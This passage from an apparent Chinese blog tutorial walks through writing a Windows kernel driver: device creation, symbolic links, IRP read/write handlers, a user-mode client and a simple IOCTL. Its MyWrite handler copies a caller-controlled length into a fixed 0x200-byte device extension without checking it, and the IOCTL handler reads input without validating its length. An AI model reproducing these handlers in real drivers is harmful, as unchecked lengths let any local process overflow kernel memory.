cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UNICODE_STRING DeviceName = &#123; <span class="number">0</span> &#125;;          <span class="comment">//设备名</span></span><br><span class="line">PDEVICE_OBJECT pDevice = <span class="literal">NULL</span>;              <span class="comment">//设备对象</span></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, DEVICE_NAME);</span><br><span class="line">Status = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="number">0</span>, &amp;DeviceName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, TRUE, &amp;pDevice);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Device Failed: %x\n&quot;</span>, Status);</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建符号链接"><a class="markdownIt-Anchor" href="#创建符号链接"></a> 创建符号链接</h3><p><img src="https://img.joe1sn.top/uploads/big/e4fce5afcd7288e9e8cb6cb95909e77f.png" alt="image-20240116141604421" /></p><p><img src="https://img.joe1sn.top/uploads/big/60c01f30c4f411d81016e83d56d4d96c.png" alt="image-20240116141556022" /></p><p>符号链接就是类似与<code>Z:\</code>之前的前缀</p><p>使用<code>WinObj</code>可以看到，我用的再第一章中下载的<code>KdmKie</code>中的<code>SymLinks</code>（太老了，建议换一个）</p><p><img src="https://img.joe1sn.top/uploads/big/7767beddb14038bf253be19869b69628.png" alt="image-20240116141803859" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UNICODE_STRING SymLink = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;SymLink, SYM_NAME);</span><br><span class="line">Status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;SymLink, &amp;DeviceName);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Symbol Link Failed: %x\n&quot;</span>, Status);</span><br><span class="line">    <span class="built_in">IoDeleteDevice</span>(pDevice);</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="关联功能的交互"><a class="markdownIt-Anchor" href="#关联功能的交互"></a> 关联功能的交互</h3><h4 id="i-创建句柄"><a class="markdownIt-Anchor" href="#i-创建句柄"></a> I. 创建“句柄”</h4><p><img src="https://img.joe1sn.top/uploads/big/bdfd8cc8b7ede9711595ddbd7f5a06f5.png" alt="image-20240116142649799" /></p><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/minidrivers-and-driver-pairs">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/minidrivers-and-driver-pairs</a></p><p>具体调试方法也在上面的文档中</p><blockquote><p>每个内核模式驱动程序都必须实现名为 <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_initialize"><strong>DriverEntry</strong></a> 的函数，该函数在加载驱动程序之后会立即得到调用。 <strong>DriverEntry</strong> 函数使用指向驱动程序实现的一些其他函数的指针来填充 <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object"><strong>DRIVER_OBJECT</strong></a> 结构的某些成员。 例如，<strong>DriverEntry</strong> 函数使用指向驱动程序的 <strong>Unload</strong> 函数的指针来填充 <strong>DRIVER_OBJECT</strong> 结构的 <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload"><em>Unload</em></a> 成员</p></blockquote><p><img src="https://img.joe1sn.top/uploads/big/021fcdc7adca77ff40fe201966cd80c5.png" alt="image-20240116143040078" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyCreate;</span><br></pre></td></tr></table></figure><p>根据上面的文档，创建的函数和主函数<code>Entry</code>差不多，<strong>这里用的是设备对象，不是驱动对象</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS </span></span><br><span class="line"><span class="function"><span class="title">MyCreate</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Opened\n&quot;</span>);</span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ii-关闭句柄"><a class="markdownIt-Anchor" href="#ii-关闭句柄"></a> II. 关闭“句柄”</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyClose;</span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = MyClean;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyClose</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Closed\n&quot;</span>);</span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyClean</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Clean\n&quot;</span>);</span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/4ece7b08bbaf2850915e56ec056c6bb5.png" alt="image-20240116150816039" /></p><p><img src="https://img.joe1sn.top/uploads/big/f997951f4d3315156cf557ea3c2f1f61.png" alt="image-20240116150757589" /></p><p>成功加载</p><h4 id="iii-在ring3进行交互"><a class="markdownIt-Anchor" href="#iii-在ring3进行交互"></a> III. 在Ring3进行交互</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\My1DeviceLinker&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice== INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error Create File\n&quot;</span>;</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success open\n&quot;</span>;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success close\n&quot;</span>;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/1d37d1b44725a3e158122215fe25ae4b.png" alt="image-20240116161601128" /></p><h1 id="c-二阶段"><a class="markdownIt-Anchor" href="#c-二阶段"></a> C. 二阶段</h1><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice</a></p><p>关于创建设备的原型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PDRIVER_OBJECT  DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceExtensionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PUNICODE_STRING DeviceName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DEVICE_TYPE     DeviceType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceCharacteristics,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOLEAN         Exclusive,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PDEVICE_OBJECT  *DeviceObject</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[in] DeviceExtensionSize</span><br></pre></td></tr></table></figure><p>指定要为 <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/device-extensions">设备对象的设备扩展</a> 分配的驱动程序确定的字节数。 设备扩展的内部结构是驱动程序定义的。</p></blockquote><ul><li>维护设备状态信息。</li><li>为驱动程序使用的任何内核定义对象或其他系统资源（如旋转锁）提供存储。</li><li>保存驱动程序必须在系统空间中驻留的任何数据，以执行其 I/O 操作。</li></ul><p>那么这就是一段描述要传输的数据的空间的大小的值。</p><h3 id="从驱动中读取"><a class="markdownIt-Anchor" href="#从驱动中读取"></a> 从驱动中读取</h3><p>驱动<code>MyRead</code>函数和<code>DriverEntry</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyRead</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(pdevice);</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Read\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">    ULONG ReadSize = pStack-&gt;Parameters.Read.Length;</span><br><span class="line">    PCHAR Buffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Ring3 Want Read %x\n&quot;</span>, ReadSize);</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(Buffer, <span class="string">&quot;Message From Driver&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Message From Driver&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="built_in">strlen</span>(<span class="string">&quot;Message From Driver&quot;</span>);</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>R3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CHAR Test[<span class="number">0x40</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD lpRead = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ReadFile</span>(hDevice, Test, <span class="number">30</span>, &amp;lpRead, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p -%s--%d\n&quot;</span>, Test, Test,lpRead);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>30</code>是要读取的字节</li><li><code>lpRead</code>是真实读取的字节</li></ul><p><img src="https://img.joe1sn.top/uploads/big/3d59cd4377a3136afc0e76d05ef229d5.png" alt="image-20240116163249545" /></p><p>每向下传递一层需要一个设备栈（可以试着从自己设计这样一个模式的角度想想）</p><p><code>SystemBuffer</code>和<code>pIrp-&gt;MdlAddress</code>是同一块物理地址的两个不同虚拟地址（不同的映射）。</p><p><img src="https://img.joe1sn.top/uploads/big/c97a37804385b4dfaec106605e5f35d4.png" alt="image-20240116165239380" /></p><p>需要设置读写方式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pDevice-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"><span class="comment">//设备创建成功，绑定符号链接</span></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/89ee511b22780e94cccf65aab59b4943.png" alt="image-20240116171657645" /></p><h3 id="向驱动中写入"><a class="markdownIt-Anchor" href="#向驱动中写入"></a> 向驱动中写入</h3><p>R3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">WriteFile</span>(hDevice, <span class="string">&quot;This is From Ring3.&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;This is From Ring3.&quot;</span>), &amp;lpRead, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>驱动</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyWrite</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(pdevice);</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Wrtitten\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">    ULONG ReadSize = pStack-&gt;Parameters.Write.Length;</span><br><span class="line">    PCHAR Buffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Ring3 Write Read %x\n&quot;</span>, ReadSize);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(pdevice-&gt;DeviceExtension, <span class="number">200</span>);</span><br><span class="line">    <span class="built_in">RtlCopyMemory</span>(pdevice-&gt;DeviceExtension, Buffer, ReadSize);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;--%p-%s\n&quot;</span>, Buffer, (PCHAR)pdevice-&gt;DeviceExtension);</span><br><span class="line"></span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="built_in">strlen</span>(<span class="string">&quot;Message From Driver&quot;</span>);</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/13f59b1ae2e3d665dcc0de8b593d6297.png" alt="image-20240116173208413" /></p><h3 id="ioctl自定义控制io"><a class="markdownIt-Anchor" href="#ioctl自定义控制io"></a> [IOCTL]自定义控制IO</h3><p><code>IRP_MJ_DEVICE_CONTROL</code>，定义IOCTL操作，<strong>很多内核的交互大多都是依靠此方式</strong></p><p>这里程序接收一个数字返回值x2</p><p>驱动</p><p>定义操作标识</p><p>MSDN：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MUL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x9888, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>0x9888：标识符号</li></ul><p>编写函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">MyControl</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> &#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(pdevice);</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    DbgPrint(<span class="string">&quot;My Device Has IOCTL\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp);</span><br><span class="line">    ULONG ioCode = pStack-&gt;Parameters.DeviceIoControl.IoControlCode;   <span class="comment">//功能码</span></span><br><span class="line">    ULONG inLen = pStack-&gt;Parameters.DeviceIoControl.InputBufferLength;     <span class="comment">//出入长度</span></span><br><span class="line">    <span class="comment">//ULONG outLen = pStack-&gt;Parameters.DeviceIoControl.OutputBufferLength;   //输出长度</span></span><br><span class="line">    ULONG ioInfo = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (ioCode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> IOCTL_MUL:</span><br><span class="line">    &#123;</span><br><span class="line">        DWORDLONG inData = *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer;   <span class="comment">//取出传输的数据</span></span><br><span class="line">        DbgPrint(<span class="string">&quot;Kernel Recive: %d, Len: %lld\n&quot;</span>, inData, inLen);</span><br><span class="line">        inData *= <span class="number">2</span>;</span><br><span class="line">        DbgPrint(<span class="string">&quot;Kernel Data %d\n&quot;</span>, inData);</span><br><span class="line">        *(PDWORDLONG)pIrp-&gt;AssociatedIrp.SystemBuffer = inData;             <span class="comment">//写回操作</span></span><br><span class="line">        ioInfo = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        RET = STATUS_UNSUCCESSFUL;</span><br><span class="line">        ioInfo = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = ioInfo;</span><br><span class="line">    IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2bbf7757867f48efe014c738e8fb56bc.png" alt="image-20240116185236732" /></p><h3 id="一些关键函数"><a class="markdownIt-Anchor" href="#一些关键函数"></a> 一些关键函数</h3><p><code>DriverEntry</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(RegistryPath);</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Running -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建设备</span></span><br><span class="line">    UNICODE_STRING DeviceName = &#123; <span class="number">0</span> &#125;;          <span class="comment">//设备名</span></span><br><span class="line">    PDEVICE_OBJECT pDevice = <span class="literal">NULL</span>;              <span class="comment">//设备对象</span></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, DEVICE_NAME);</span><br><span class="line">    Status = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="number">0x200</span>, &amp;DeviceName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, TRUE, &amp;pDevice);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Device Failed: %x\n&quot;</span>, Status);</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pDevice-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line">    <span class="comment">//设备创建成功，绑定符号链接</span></span><br><span class="line"></span><br><span class="line">    UNICODE_STRING SymLink = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;SymLink, SYM_NAME);</span><br><span class="line">    Status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;SymLink, &amp;DeviceName);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Symbol Link Failed: %x\n&quot;</span>, Status);</span><br><span class="line">        <span class="built_in">IoDeleteDevice</span>(pDevice);</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Device &amp; Symbolic Link Created\n&quot;</span>);</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyCreate;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyClose;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = MyClean;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_READ] = MyRead;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = MyWrite;</span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyControl;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Function Settal Done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>DriverUnload</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Stopping -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Device Stopping\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> 